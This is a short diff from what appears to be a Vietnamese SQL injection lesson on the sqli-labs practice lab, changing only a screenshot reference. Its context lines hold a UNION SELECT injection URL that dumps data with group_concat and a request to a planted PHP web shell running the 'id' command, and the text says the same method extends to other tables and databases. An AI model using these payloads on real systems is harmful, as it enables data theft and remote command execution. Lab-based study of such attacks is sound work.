@@ -117,6 +117,6 @@ http://192.168.80.225/sqli-labs/Less-1/?id=1'  union SELECT 1,2,group_concat(Hos
 192.168.80.225/tests/c.php?cmd=id
 ```
 
-![](../images/lesson1/screen_13.png)
+![](../images/lesson1/screen_14.png)
 
 Tương tự như thế thì đối với các bảng và các DB khác thì ta truy suất tương tự như thế và thay tên các trường các table các DB mà ta mong muốn. 
